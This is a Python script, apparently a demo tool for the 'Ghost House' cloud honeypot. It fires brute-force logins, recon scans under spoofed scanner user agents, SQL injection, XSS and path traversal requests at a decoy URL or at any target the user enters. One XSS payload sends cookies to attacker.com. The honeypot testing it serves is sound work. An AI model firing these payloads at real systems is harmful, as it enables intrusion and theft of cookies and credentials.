import argparse
import json
import time
import urllib.request
import urllib.error

DEFAULT_TARGET = "https://6jcln499oi.execute-api.ap-south-1.amazonaws.com/default/ghostHouseDecoy"


def send_request(url, method="GET", data=None, user_agent=None):
    start = time.time()
    try:
        headers = {
            "Content-Type": "application/json",
            "User-Agent": user_agent or "GhostHouse-AttackSim/2.0"
        }

        body = None
        if data is not None:
            body = json.dumps(data).encode("utf-8")

        request = urllib.request.Request(
            url,
            data=body,
            headers=headers,
            method=method
        )

        with urllib.request.urlopen(request, timeout=10) as response:
            elapsed = (time.time() - start) * 1000
            print(f"  [{response.status}] {method:<5} {url} ({elapsed:.0f} ms)")
            return response.status

    except urllib.error.HTTPError as error:
        elapsed = (time.time() - start) * 1000
        print(f"  [{error.code}] {method:<5} {url} ({elapsed:.0f} ms)")
        return error.code

    except Exception as error:
        print(f"  [ERR]   {method:<5} {url} -> {error}")
        return 0


def normal_probe(target):
    print("\n[+] === 1. NORMAL BENIGN PROBE ===")
    send_request(
        f"{target}/login",
        "POST",
        {
            "username": "testuser",
            "password": "TestPassword@123"
        }
    )


def brute_force(target):
    print("\n[!] === 2. BRUTE FORCE ATTACK SIMULATION ===")
    passwords = [
        "password123",
        "admin123",
        "test123",
        "welcome123",
        "qwerty123",
        "letmein123",
        "ghost123",
        "password1"
    ]

    for pwd in passwords:
        send_request(
            f"{target}/login",
            "POST",
            {
                "username": "admin",
                "password": pwd
            }
        )
        time.sleep(0.25)


def scanner(target):
    print("\n[!] === 3. RECONNAISSANCE SCANNER SIMULATION ===")
    paths = [
        "/",
        "/login",
        "/dashboard",
        "/admin",
        "/users",
        "/api-keys",
        "/robots.txt",
        "/.env",
        "/config",
        "/api"
    ]

    for path in paths:
        send_request(f"{target}{path}", "GET", user_agent="Nikto/2.1.6")
        time.sleep(0.2)


def sqli(target):
    print("\n[!] === 4. SQL INJECTION SIMULATION ===")
    payloads = [
        "' OR '1'='1",
        "' OR 1=1 --",
        "admin'--",
        "' UNION SELECT NULL, username, password FROM users --"
    ]

    for payload in payloads:
        send_request(
            f"{target}/login",
            "POST",
            {
                "username": payload,
                "password": "test"
            },
            user_agent="sqlmap/1.7.2#stable"
        )
        time.sleep(0.3)


def xss(target):
    print("\n[!] === 5. CROSS-SITE SCRIPTING (XSS) SIMULATION ===")
    payloads = [
        "<script>alert('GHOST_HOUSE_XSS')</script>",
        "<img src=x onerror=alert('PWNED')>",
        "\"><svg/onload=fetch('http://attacker.com/steal?c='+document.cookie)>"
    ]

    for payload in payloads:
        send_request(
            f"{target}/login",
            "POST",
            {
                "username": payload,
                "password": "xss_test_password"
            }
        )
        time.sleep(0.3)


def traversal(target):
    print("\n[!] === 6. PATH TRAVERSAL SIMULATION ===")
    paths = [
        "/..%2f..%2f..%2fetc/passwd",
        "/../../../../etc/shadow",
        "/.git/config",
        "/.aws/credentials",
        "/windows/win.ini"
    ]

    for path in paths:
        send_request(f"{target}{path}", "GET")
        time.sleep(0.2)


def run_all(target):
    print("\n" + "=" * 60)
    print("      GHOST HOUSE COMPREHENSIVE ATTACK SUITE DEMO")
    print("=" * 60)
    print(f"Target Honeypot: {target}\n")

    normal_probe(target)
    time.sleep(0.5)

    brute_force(target)
    time.sleep(0.5)

    scanner(target)
    time.sleep(0.5)

    sqli(target)
    time.sleep(0.5)

    xss(target)
    time.sleep(0.5)

    traversal(target)

    print("\n" + "=" * 60)
    print("[✓] ALL SIMULATIONS COMPLETED SUCCESSFULLY")
    print("Check your Ghost House Security Monitor dashboard to view the live logs!")
    print("=" * 60 + "\n")


def interactive_menu():
    print("\n========================================")
    print("    GHOST HOUSE ATTACK SIMULATOR")
    print("========================================")
    target_input = input(f"Enter target URL (Press Enter for default: {DEFAULT_TARGET}): ").strip()
    target = target_input.rstrip("/") if target_input else DEFAULT_TARGET

    print("\nSelect Simulation Mode:")
    print("  1. Normal Probe (Benign)")
    print("  2. Brute Force (Credential Stuffing)")
    print("  3. Scanner (Directory Recon)")
    print("  4. SQL Injection (SQLi)")
    print("  5. Cross-Site Scripting (XSS)")
    print("  6. Path Traversal")
    print("  7. Run All (Complete Presentation Demo)")
    print("  0. Exit")

    choice = input("\nChoice [1-7]: ").strip()

    mode_map = {
        "1": "normal",
        "2": "brute",
        "3": "scanner",
        "4": "sqli",
        "5": "xss",
        "6": "traversal",
        "7": "all"
    }

    if choice in mode_map:
        return target, mode_map[choice]
    else:
        print("Exiting.")
        exit(0)


def main():
    parser = argparse.ArgumentParser(
        description="Ghost House Cloud Honeypot Attack Simulation Tool"
    )

    parser.add_argument(
        "--target",
        default=DEFAULT_TARGET,
        help=f"Base URL of your Ghost House deployment (default: {DEFAULT_TARGET})"
    )

    parser.add_argument(
        "--mode",
        choices=[
            "normal",
            "brute",
            "scanner",
            "sqli",
            "xss",
            "traversal",
            "all"
        ],
        help="Simulation mode. If omitted, opens interactive menu."
    )

    args = parser.parse_args()

    # If no mode is specified via CLI, launch the interactive menu
    if not args.mode:
        target, mode = interactive_menu()
    else:
        target = args.target.rstrip("/")
        mode = args.mode

    if mode == "normal":
        normal_probe(target)
    elif mode == "brute":
        brute_force(target)
    elif mode == "scanner":
        scanner(target)
    elif mode == "sqli":
        sqli(target)
    elif mode == "xss":
        xss(target)
    elif mode == "traversal":
        traversal(target)
    elif mode == "all":
        run_all(target)


if __name__ == "__main__":
    main()